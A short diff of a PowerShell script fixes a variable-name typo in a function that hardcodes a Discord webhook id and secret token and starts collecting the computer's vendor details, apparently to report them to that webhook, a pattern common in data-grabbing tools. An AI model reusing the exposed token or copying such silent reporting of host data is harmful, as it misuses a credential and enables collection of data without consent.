@@ -42,7 +42,7 @@ Write-Host "--------------------------------------------------------------------
 function webhooks {
     $webhookid = "1337473388624609390"
     $webhooktoken = "frh_h08OFoFeTSUUF-FqHg2ZoJVh6Xjj8YbVzgOyztWuPANtpogg0AUKPWtWC7tsswe8"
-    $$discordWebhookUrl = "https://discord.com/api/webhooks/$webhookid/$webhooktoken"
+    $discordWebhookUrl = "https://discord.com/api/webhooks/$webhookid/$webhooktoken"
     
     $computerSystem = Get-CimInstance -ClassName Win32_ComputerSystemProduct
     $manufacturer = $computerSystem.Vendor
